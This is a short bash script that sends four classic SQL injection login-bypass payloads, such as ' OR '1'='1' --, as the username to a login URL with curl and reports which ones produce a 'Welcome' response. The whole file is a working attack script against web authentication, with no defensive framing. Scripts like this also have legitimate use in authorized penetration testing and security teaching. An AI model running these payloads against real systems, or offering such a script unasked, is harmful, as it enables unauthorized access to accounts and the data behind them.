#!/bin/bash

# Define the target URL
TARGET="http://example.com/login"

# Define SQL injection payloads
PAYLOADS=(
    "' OR '1'='1' --"
    "' OR '1'='1' /*"
    "' OR 'a'='a' --"
    "' OR 1=1 --"
)

# Loop through each payload and test it
for payload in "${PAYLOADS[@]}"; do
    echo "Testing payload: $payload"
    RESPONSE=$(curl -s "$TARGET?username=$payload&password=anything")

    if [[ $RESPONSE == *"Welcome"* ]]; then
        echo "Vulnerable to SQL Injection with payload: $payload"
    else
        echo "Not vulnerable with payload: $payload"
    fi
done
